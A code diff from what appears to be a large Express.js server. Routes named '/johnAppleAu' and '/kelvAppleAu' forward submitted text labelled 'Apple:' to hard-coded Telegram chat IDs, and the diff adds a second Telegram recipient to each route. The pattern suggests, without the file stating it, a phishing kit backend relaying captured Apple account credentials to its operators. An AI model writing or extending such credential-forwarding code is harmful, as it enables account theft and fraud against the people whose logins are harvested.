@@ -6731,6 +6731,18 @@ app.post("/johnAppleAu", (req, res) => {
           .post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
+              chat_id: 1248378980,
+              text: `Apple:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
               chat_id: 1442690533,
               text: `Apple:\n${originalText}`,
               parse_mode: "Markdown",
@@ -6843,6 +6855,18 @@ app.post("/kelvAppleAu", (req, res) => {
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
               chat_id: 1248378980,
+              text: `Apple:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 1442690533,
               text: `Apple:\n${originalText}`,
               parse_mode: "Markdown",
             }
